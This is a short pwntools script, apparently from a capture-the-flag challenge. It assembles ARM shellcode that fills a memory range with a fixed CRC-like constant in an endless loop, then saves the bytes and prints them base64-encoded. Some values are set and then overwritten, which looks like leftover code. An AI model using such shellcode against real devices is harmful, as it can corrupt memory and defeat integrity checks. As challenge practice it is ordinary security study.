#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
crc= 0x74d7f2d0
crc=0xcc0b89f6

shellcode = """
    mov r1,0xd0000000
    add r1,0xf20000
    add r1,0xd700
    add r1,0x74
    mov r1,0xf6000000
    add r1,0x890000
    add r1,0x0b00
    add r1,0xcc
    mov r4,r1
    mov r5,r1
    mov r6,r1
    mov r7,r1
    mov r8,r1
    mov r9,r1
    mov r10,r1
    mov r11,r1
start:
    mov r2,0x1f000
here:
    stm r2!,{r4-r11}
    cmp r2,0x20000
    bl here
    b start
"""
import base64
code=asm(shellcode,arch="arm")
print base64.b64encode(code)
with open("bin","w+") as f:
    f.write(code)



